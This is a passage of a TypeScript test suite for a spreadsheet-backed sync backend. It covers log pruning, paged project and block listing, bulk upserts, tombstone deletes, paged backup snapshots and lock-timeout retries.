        ]),
      ]
      log.getRange(1, 1, seeded.length, header.length).setValues(seeded)
      expect(log.dataRowCount()).toBe(15_001)

      expectOk(call(backend, 'ping'), 'ping past the ceiling')
      expect(log.dataRowCount()).toBeLessThan(6_000)
      expect(backend.stats.logRowsPruned).toBeGreaterThan(9_000)
    })

    it('lists, reads and bulk-writes projects as documented', () => {
      const backend = fresh()
      expectOk(call(backend, 'ping'), 'ping')
      expectOk(
        call(backend, 'pushChanges', {
          changes: [
            change('projects', project('prj_a', NOW)),
            change('projects', project('prj_b', NOW + 1)),
            change('pages', page('pg_a', 'prj_a', NOW + 2)),
            change('blocks', block('blk_a1', 'prj_a', 'pg_a', NOW + 3)),
            change('blocks', block('blk_a2', 'prj_a', 'pg_a', NOW + 4)),
          ],
        }),
        'seed',
      )

      const listed = expectOk(call(backend, 'listProjects'), 'listProjects')
      expect(num(listed.count, 'count')).toBe(2)
      expect(listed.truncated).toBe(false)

      const firstPage = expectOk(
        call(backend, 'getProject', { projectId: 'prj_a', limit: 1 }),
        'getProject',
      )
      expect(num(firstPage.blockTotal, 'blockTotal')).toBe(2)
      expect(list(firstPage.blocks, 'blocks')).toHaveLength(1)
      expect(firstPage.hasMoreBlocks).toBe(true)
      const secondPage = expectOk(
        call(backend, 'getProject', { projectId: 'prj_a', limit: 1, offset: 1 }),
        'getProject page 2',
      )
      expect(num(secondPage.blockOffset, 'blockOffset')).toBe(1)
      expect(secondPage.hasMoreBlocks).toBe(false)

      const bulk = expectOk(
        call(backend, 'upsertBlocks', {
          projectId: 'prj_b',
          blocks: [
            block('blk_b1', 'ignored', 'pg_b', NOW + 5),
            { record: block('blk_b2', 'ignored', 'pg_b', NOW + 6), deviceId: DEVICE },
          ],
        }),
        'upsertBlocks',
      )
      expect(num(bulk.applied, 'applied')).toBe(2)
      // The owning project is the request's, whatever the entry claimed.
      expect(backend.sheet('Blocks')!.rowById('blk_b1')!.projectId).toBe('prj_b')
      expect(backend.sheet('Blocks')!.rowById('blk_b2')!.projectId).toBe('prj_b')

      expectOk(
        call(backend, 'pushChanges', {
          changes: [change('projects', project('prj_a', NOW + 10), 'delete')],
        }),
        'tombstone prj_a',
      )
      expectCoded(
        call(backend, 'getProject', { projectId: 'prj_a' }),
        'NOT_FOUND',
        'deleted project',
      )
      const after = expectOk(call(backend, 'listProjects'), 'listProjects after delete')
      expect(num(after.count, 'count')).toBe(1)
    })

    it('pages a backup snapshot with its own cursor', () => {
      const backend = fresh()
      expectOk(call(backend, 'ping'), 'ping')
      const changes = [
        change('projects', project('prj_1', NOW)),
        ...Array.from({ length: 5 }, (_, i) => change('pages', page(`pg_${i}`, 'prj_1', NOW + i))),
      ]
      expectOk(call(backend, 'pushChanges', { changes }), 'seed')

      let cursor: unknown
      let rows = 0
      let calls = 0
      for (let guard = 0; guard < 20; guard += 1) {
        const body: Record<string, unknown> = { pageSize: 2 }
        if (cursor !== undefined) body.cursor = cursor
        const res = expectOk(call(backend, 'backup', body), 'backup')
        calls += 1
        const snapshot = res.snapshot as Record<string, { rows: unknown[] }>
        rows += Object.values(snapshot).reduce((sum, sheet) => sum + sheet.rows.length, 0)
        if (res.partial !== true) break
        cursor = res.nextCursor
      }
      expect(calls).toBeGreaterThan(1)
      expect(rows).toBe(6)
    })

    it('surfaces LOCK_TIMEOUT while another session holds the lock', () => {
      const backend = fresh()
      expectOk(call(backend, 'ping'), 'ping')
      backend.failLocks(1)
      expectCoded(
        call(backend, 'pushChanges', { changes: [change('projects', project('prj_1', NOW))] }),
        'LOCK_TIMEOUT',
        'busy spreadsheet',
      )
      // The lock was released in `finally`, so the retry gets through.
      expectOk(
        call(backend, 'pushChanges', { changes: [change('projects', project('prj_1', NOW))] }),
        'retry after the lock frees',
      )
    })
  })
})
